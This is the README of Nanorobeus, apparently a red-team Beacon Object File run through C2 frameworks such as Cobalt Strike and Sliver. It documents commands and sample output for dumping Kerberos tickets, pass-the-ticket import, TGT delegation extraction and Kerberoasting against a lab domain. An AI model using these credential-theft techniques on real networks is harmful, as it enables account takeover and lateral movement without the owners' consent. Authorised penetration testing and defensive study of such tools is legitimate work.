# Nanorobeus
COFF file (BOF) for managing Kerberos tickets.

## Supported agents
* [Sliver](https://github.com/BishopFox/sliver)
* [Brute Ratel](https://bruteratel.com)
* [Cobalt Strike](https://www.cobaltstrike.com)
## Commands

**luid** - get current logon ID

**sessions** *[/luid:<0x0>| /all]* - get logon sessions

**klist** *[/luid:<0x0> | /all]* - list Kerberos tickets

**dump** *[/luid:<0x0> | /all]* - dump Kerberos tickets

**ptt** */ticket:\<base64\> [/luid:<0x0>]* - import Kerberos ticket into a logon session

**purge** *[/luid:<0x0>]* - purge Kerberos tickets

**tgtdeleg** *\/spn:<spn\>* - retrieve a usable TGT for the current user

**kerberoast** *\/spn:<spn\>* - perform Kerberoasting against specified SPN

## Examples
Get current logon ID.
```
=> nanorobeus64 luid

[+] Current LogonId: 0:0x19ea88e
```
Get detailed information about the current logon session.
```
=> nanorobeus64 sessions

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local
```
List Kerberos tickets for the current logon session. When elevated, use `/all` to list tickets from all of the sessions or `/luid:0x0` to list tickets in a specified logon session.
```
=> nanorobeus64 klist

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local

[*] Cached tickets: (6)

	[0]
	Client name     : User @ FORTRESS.LOCAL
	Server name     : krbtgt/FORTRESS.LOCAL @ FORTRESS.LOCAL
	Start time      : 2/7/2022 19:22:44 (UTC)
	End time        : 3/7/2022 5:22:43 (UTC)
	Renew time      : 9/7/2022 19:22:43 (UTC)
	Flags           : forwardable, forwarded, renewable, pre_authent, name_canonicalize (0x60a10000)
	Encryption type : AES256_CTS_HMAC_SHA1
    ...(snip)...
```
Dump tickets from the current logon session. When elevated, use `/all` to dump tickets from all of the sessions or `/luid:0x0` to dump tickets from a specified logon session.
```
=> nanorobeus64 dump

UserName                : User
Domain                  : FORTRESS
LogonId                 : 0:0x19ea88e
Session                 : 2
UserSID                 : S-1-5-21-1768674056-2740991423-664180583-1105
Authentication package  : Kerberos
LogonType               : Interactive
LogonTime (UTC)         : 2/7/2022 19:22:43
LogonServer             : SERVER
LogonServerDNSDomain    : FORTRESS.LOCAL
UserPrincipalName       : user@fortress.local

[*] Cached tickets: (6)

	[0]
	Client name     : User @ FORTRESS.LOCAL
	Server name     : krbtgt/FORTRESS.LOCAL @ FORTRESS.LOCAL
	Start time      : 2/7/2022 19:22:44 (UTC)
	End time        : 3/7/2022 5:22:43 (UTC)
	Renew time      : 9/7/2022 19:22:43 (UTC)
	Flags           : forwardable, forwarded, renewable, pre_authent, name_canonicalize (0x60a10000)
	Encryption type : AES256_CTS_HMAC_SHA1
	Ticket          : doIFFjCCBRKgAwIBBaEDAgEWooIEGTCCBBVhggQRMIIEDaADAg...(snip)...
```
Import a ticket into the current logon session. When elevated, use `/luid:0x0` to import the ticket into a specified logon session.
```
=> make_token network fortress.local test pass
=> nanorobeus64 ptt /ticket:doIFqjCCBaagAwIB...snip...

[+] Ticket successfully imported.
```
Purge all Kerberos tickets from the current logon session. When elevated, use `/luid:0x0` to purge the tickets from a specified logon session.
```
=> nanorobeus64 purge

[+] Successfully purged tickets.
```
Retrieve a usable TGT for the current user.
```
=> nanorobeus64 tgtdeleg /spn:cifs/server.fortress.local

[*] Found the AP-REQ delegation ticket in the GSS-API output
[*] Authenticator etype: AES256_CTS_HMAC_SHA1
[*] Successfully extracted the service ticket session key
[*] Successfully decrypted authenticator
[+] Successfully extracted TGT: doIFeDCCBXSgAwIBBaEDAgEWooIEcjC...(snip)...
```
Perform Kerberoasting by specifying SPN:
```
=> nanorobeus64 kerberoast /spn:HTTP/server.fortress.local

[*] Target SPN: HTTP/server.fortress.local
[+] Hash: $krb5tgs$23$*$FORTRESS.LOCAL$HTTP/server.fortress.local*$ac5e2f4d28fd377...(snip)...
```

## Credits
* Rubeus - https://github.com/GhostPack/Rubeus
* mimikatz - https://github.com/gentilkiwi/mimikatz
* kekeo - https://github.com/gentilkiwi/kekeo 